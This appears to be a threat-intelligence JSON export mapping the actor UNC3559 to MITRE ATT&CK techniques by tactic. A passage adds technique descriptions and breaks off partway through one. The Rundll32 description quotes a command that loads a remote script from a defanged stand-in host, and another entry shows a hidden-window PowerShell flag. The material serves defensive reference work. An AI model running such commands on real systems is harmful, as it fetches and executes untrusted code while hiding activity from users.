{
  "id": "threat-actor--878fa5e3-db56-5c11-add8-44659d72fd2b",
  "name": "UNC3559",
  "type": "actor-mitre",
  "attack-patterns": {
    "Persistence": [
      {
        "id": "attack-pattern--389735f1-f21c-4208-b8f0-f8031e7169b8",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279",
            "attribution_scope": "confirmed"
          }
        ]
      }
    ],
    "Impact": [
      {
        "id": "attack-pattern--1988cc35-ced8-4dad-b2d1-7628488fa967",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
            "attribution_scope": "confirmed"
          }
        ]
      }
    ],
    "Lateral Movement": [
      {
        "id": "attack-pattern--3b744087-9945-4a6f-91e8-9dbceda417a4",
        "attribution_scope": "confirmed"
      }
    ],
    "Execution": [
      {
        "id": "attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
            "attribution_scope": "confirmed"
          }
        ]
      }
    ],
    "Resource Development": [
      {
        "id": "attack-pattern--7e3beebd-8bfe-4e7b-a892-e44ab06a75f9",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--ce0687a0-e692-4b77-964a-0784a8e54ff1",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--e7cbc1de-1f79-48ee-abfd-da1241c65a15",
            "attribution_scope": "confirmed"
          }
        ]
      }
    ],
    "Privilege Escalation": [
      {
        "id": "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279",
            "attribution_scope": "confirmed"
          }
        ]
      }
    ],
    "Defense Evasion": [
      {
        "id": "attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--b83e166d-13d7-4b52-8677-dff90c548fd7",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--32901740-b42c-4fdd-bc02-345b5dc57082",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--457c7820-d331-465a-915e-42f85500ccc4",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--365be77f-fc0e-42ee-bac8-4faf806d9336",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--c726e0a2-a57a-4b7b-a973-d0f013246617",
            "attribution_scope": "confirmed"
          }
        ]
      }
    ],
    "Discovery": [
      {
        "id": "attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18",
        "attribution_scope": "confirmed"
      }
    ],
    "Initial Access": [
      {
        "id": "attack-pattern--d742a578-d70e-4d0e-96a6-02a9c30204e6",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--3b744087-9945-4a6f-91e8-9dbceda417a4",
        "attribution_scope": "confirmed"
      }
    ],
    "Collection": [
      {
        "id": "attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c",
            "attribution_scope": "confirmed"
          }
        ]
      }
    ],
    "Command and Control": [
      {
        "id": "attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--1996eef1-ced3-4d7f-bf94-33298cabbf72",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--ca9d3402-ada3-484d-876a-d717bd6e05f2",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add",
        "attribution_scope": "confirmed"
      }
    ]
  },
  "is_publishable": true
}
"{\"threat-actors\": [{\"id\": \"threat-actor--878fa5e3-db56-5c11-add8-44659d72fd2b\", \"name\": \"UNC3559\", \"type\": \"actor-mitre\", \"attack-patterns\": {\"Persistence\": [{\"id\": \"attack-pattern--389735f1-f21c-4208-b8f0-f8031e7169b8\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279\", \"attribution_scope\": \"confirmed\"}]}], \"Impact\": [{\"id\": \"attack-pattern--1988cc35-ced8-4dad-b2d1-7628488fa967\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9\", \"attribution_scope\": \"confirmed\"}]}], \"Lateral Movement\": [{\"id\": \"attack-pattern--3b744087-9945-4a6f-91e8-9dbceda417a4\", \"attribution_scope\": \"confirmed\"}], \"Execution\": [{\"id\": \"attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9\", \"attribution_scope\": \"confirmed\"}]}], \"Resource Development\": [{\"id\": \"attack-pattern--7e3beebd-8bfe-4e7b-a892-e44ab06a75f9\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--ce0687a0-e692-4b77-964a-0784a8e54ff1\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--e7cbc1de-1f79-48ee-abfd-da1241c65a15\", \"attribution_scope\": \"confirmed\"}]}], \"Privilege Escalation\": [{\"id\": \"attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279\", \"attribution_scope\": \"confirmed\"}]}], \"Defense Evasion\": [{\"id\": \"attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--b83e166d-13d7-4b52-8677-dff90c548fd7\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--32901740-b42c-4fdd-bc02-345b5dc57082\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--457c7820-d331-465a-915e-42f85500ccc4\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--365be77f-fc0e-42ee-bac8-4faf806d9336\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--c726e0a2-a57a-4b7b-a973-d0f013246617\", \"attribution_scope\": \"confirmed\"}]}], \"Discovery\": [{\"id\": \"attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18\", \"attribution_scope\": \"confirmed\"}], \"Initial Access\": [{\"id\": \"attack-pattern--d742a578-d70e-4d0e-96a6-02a9c30204e6\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--3b744087-9945-4a6f-91e8-9dbceda417a4\", \"attribution_scope\": \"confirmed\"}], \"Collection\": [{\"id\": \"attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c\", \"attribution_scope\": \"confirmed\"}]}], \"Command and Control\": [{\"id\": \"attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--1996eef1-ced3-4d7f-bf94-33298cabbf72\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--ca9d3402-ada3-484d-876a-d717bd6e05f2\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add\", \"attribution_scope\": \"confirmed\"}]}, \"is_publishable\": true}], \"attack-patterns\": {\"attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:58.938Z\", \"name\": \"Data Staged\", \"attack_pattern_identifier\": \"T1074\", \"description\": \"Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.(Citation: PWC Cloud Hopper April 2017)\\n\\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)\\n\\nAdversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.\", \"modified\": \"2020-09-14T19:48:08.180Z\", \"id\": \"attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e\"}, \"attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-23T18:03:46.248Z\", \"name\": \"Rundll32\", \"attack_pattern_identifier\": \"T1218.011\", \"description\": \"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.\\n\\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\\n\\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\\\"\\\\..\\\\mshtml,RunHTMLApplication \\\";document.write();GetObject(\\\"script:https[:]//www[.]example[.]com/malicious.sct\\\")\\\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\", \"modified\": \"2020-06-20T22:31:42.113Z\", \"id\": \"attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5\"}, \"attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-09T13:48:55.078Z\", \"name\": \"PowerShell\", \"attack_pattern_identifier\": \"T1059.001\", \"modified\": \"2020-06-24T13:51:22.360Z\", \"description\": \"Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\\n\\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\\n\\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)\\n\\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)\", \"id\": \"attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736\"}, \"attack-pattern--32901740-b42c-4fdd-bc02-345b5dc57082\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-05T16:27:37.784Z\", \"name\": \"Code Signing\", \"attack_pattern_identifier\": \"T1553.002\", \"description\": \"Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) The certificates used during an operation may be created, acquired, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this activity will result in a valid signature.\\n\\nCode signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing) \\n\\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system. \", \"modified\": \"2020-02-10T19:51:01.601Z\", \"id\": \"attack-pattern--32901740-b42c-4fdd-bc02-345b5dc57082\"}, \"attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-13T20:26:49.433Z\", \"name\": \"Hidden Window\", \"attack_pattern_identifier\": \"T1564.003\", \"description\": \"Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \\n\\nOn Windows, there are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>. (Citation: PowerShell About 2019)\\n\\nSimilarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\\n\\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)\", \"modified\": \"2020-03-29T22:49:43.557Z\", \"id\": \"attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0\"}, \"attack-pattern--b83e166d-13d7-4b52-8677-dff90c548fd7\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-02-05T14:54:07.588Z\", \"name\": \"Subvert Trust Controls\", \"attack_pattern_identifier\": \"T1553\", \"description\": \"Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.\\n\\nAdversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates) \", \"modified\": \"2020-06-20T22:42:26.314Z\", \"id\": \"attack-pattern--b83e166d-13d7-4b52-8677-dff90c548fd7\"}, \"attack-pattern--3b744087-9945-4a6f-91e8-9dbceda417a4\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:08.977Z\", \"name\": \"Replication Through Removable Media\", \"attack_pattern_identifier\": \"T1091\", \"description\": \"Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.\", \"modified\": \"2020-07-14T19:45:59.638Z\", \"id\": \"attack-pattern--3b744087-9945-4a6f-91e8-9dbceda417a4\"}, \"attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-06-23T19:12:24.924Z\", \"name\": \"JavaScript/JScript\", \"attack_pattern_identifier\": \"T1059.007\", \"description\": \"Adversaries may abuse JavaScript and/or JScript for execution. JavaScript (JS) is a platform-agnostic scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)\\n\\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\\n\\nAdversaries may abuse JavaScript / JScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).\", \"modified\": \"2020-06-25T03:23:13.804Z\", \"id\": \"attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d\"}, \"attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2018-04-18T17:59:24.739Z\", \"name\": \"Indirect Command Execution\", \"attack_pattern_identifier\": \"T1202\", \"modified\": \"2020-06-20T22:09:22.559Z\", \"description\": \"Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)\\n\\nAdversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.\", \"id\": \"attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e\"}, \"attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-15T16:13:46.151Z\", \"name\": \"Web Protocols\", \"attack_pattern_identifier\": \"T1071.001\", \"description\": \"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \\n\\nProtocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. \", \"modified\": \"2020-03-26T20:15:35.821Z\", \"id\": \"attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161\"}, \"attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:16.408Z\", \"name\": \"Ingress Tool Transfer\", \"attack_pattern_identifier\": \"T1105\", \"modified\": \"2020-03-20T15:42:48.595Z\", \"description\": \"Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\", \"id\": \"attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add\"}, \"attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:47.843Z\", \"name\": \"Process Injection\", \"attack_pattern_identifier\": \"T1055\", \"description\": \"Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \\n\\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \\n\\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. \", \"modified\": \"2020-06-20T22:28:45.651Z\", \"id\": \"attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d\"}, \"attack-pattern--7e3beebd-8bfe-4e7b-a892-e44ab06a75f9\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-10-01T00:36:30.759Z\", \"name\": \"Compromise Infrastructure\", \"attack_pattern_identifier\": \"T1584\", \"description\": \"Before compromising a victim, adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, and third-party web services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: ICANNDomainNameHijacking)(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye EPS Awakens Part 2) Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.\\n\\nUse of compromised infrastructure allows an adversary to stage, launch, and execute an operation. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. By using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.(Citation: NSA NCSC Turla OilRig)\", \"modified\": \"2020-10-22T18:03:23.937Z\", \"id\": \"attack-pattern--7e3beebd-8bfe-4e7b-a892-e44ab06a75f9\"}, \"attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:10.728Z\", \"name\": \"Non-Application Layer Protocol\", \"attack_pattern_identifier\": \"T1095\", \"modified\": \"2020-10-21T19:41:49.412Z\", \"description\": \"Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is 